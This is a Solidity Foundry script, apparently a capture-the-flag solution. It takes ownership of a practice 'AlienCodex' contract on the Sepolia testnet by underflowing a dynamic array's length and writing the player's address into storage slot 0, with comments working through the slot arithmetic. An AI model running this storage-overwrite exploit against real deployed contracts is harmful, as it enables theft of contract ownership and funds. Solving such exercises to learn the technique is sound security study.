// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

// AlienCodex  contract address: "0x9831378FF62ad5C8e022EB9964f2cdd519C8a45B"

interface IAlienCodex {
    function contact() external returns (bool);

    function makeContact() external;

    function record(bytes32) external;

    function retract() external;

    function revise(uint256, bytes32) external;
}

contract TriggerAttack is Script {
    IAlienCodex public alienCodex;

    address alienCodexAddr = 0x9831378FF62ad5C8e022EB9964f2cdd519C8a45B;
    address player = 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        // Connect to our AlienCodex contract
        vm.startBroadcast(privateKey);
        alienCodex = IAlienCodex(alienCodexAddr);
        vm.stopBroadcast();

        // set contact to true to be abble to access the contacted modified functions
        // set codex.length to 2**256-1 by underflowing it to gain control of the contracts storage
        // use revise() to set to set alot slot(owner) to our desired value
        //using cast command(below) to verify our owner is located at slot index 0
        vm.startBroadcast(privateKey);
        alienCodex.makeContact();

        alienCodex.retract();

        alienCodex.revise(getSlotIndex(), bytes32(uint256(uint160(player))));

        vm.stopBroadcast();
    }

    function getSlotIndex() internal pure returns (uint256) {
        uint256 arrayIndex = 1;
        // The array elements begins at the hash of the array length position
        uint256 arrayFirstElement = uint256(
            keccak256(abi.encodePacked(arrayIndex))
        );
        uint256 lastSlot = 2 ** 256 - 1;
        uint256 slotIndex = lastSlot - arrayFirstElement + 1;
        return slotIndex;
    }
}

/*
    storage
    slot 0 - owner (20 bytes), contact (1 byte)
    slot 1 - length of the array codex

    // slot where array element is stored = keccak256(slot) + index
    // h = keccak256(1) //80084422859880547211683076133703299733277748156566366325829078699459944778998
    slot h + 0 - codex[0] 
    slot h + 1 - codex[1] 
    slot h + 2 - codex[2] 
    slot h + 3 - codex[3] 

    Find i such that
    slot h + i = slot 0
    h + i = 0 so i = 0 - h

    Star
*/

// keccak256(1) = 80084422859880547211683076133703299733277748156566366325829078699459944778998
// codex[0] = keccak256(1) + 0 = slot 80084422859880547211683076133703299733277748156566366325829078699459944778998
// codex[1] = keccak256(1) + 1 = slot 80084422859880547211683076133703299733277748156566366325829078699459944778999
// codex[2] = keccak256(1) + 2 = slot 80084422859880547211683076133703299733277748156566366325829078699459944779000
// slot 0 = keccak256(1) + ? = codex[?]

// ? = 0 - keccak256(1)

// 80084422859880547211683076133703299733277748156566366325829078699459944778998 + i = 0
// i = -80084422859880547211683076133703299733277748156566366325829078699459944778998
// i = -hash1

// cast storage 0x9831378FF62ad5C8e022EB9964f2cdd519C8a45B 0 --rpc-url $SEPOLIA_RPC_URL
//0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11 (owner before script was ran)
// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
